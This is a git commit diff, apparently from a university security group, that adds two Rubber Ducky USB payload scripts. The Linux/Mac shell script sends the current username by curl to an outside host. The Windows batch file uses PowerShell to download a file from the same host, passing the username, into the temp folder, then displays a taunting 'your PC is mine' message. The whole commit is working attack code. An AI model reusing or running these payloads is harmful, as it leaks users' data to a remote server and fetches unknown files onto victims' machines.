515c51081ef9fcc947676baea32f8a08f8090135
USP_IMEsec <imesec@protonmail.com>
2017-05-24 19:56:50 -0300

    Adicionado arquivos para desenvolvimento de codigo para Rubber Ducky

---
+++ Rubber Ducky/linuxMac.sh
@@ -0,0 +1,2 @@
+username=$(whoami)
+curl http://megakiller.sytes.net:9000/daniel/g.php?$username
---
+++ Rubber Ducky/win.bat
@@ -0,0 +1,2 @@
+powershell -command "&{(New-Object Net.WebClient).DownloadFile('http://megakiller.sytes.net:9000/daniel/g.php?%username%','%temp%/a')}"
+msg %username% MUAHAHAHA SEU PC É MEU
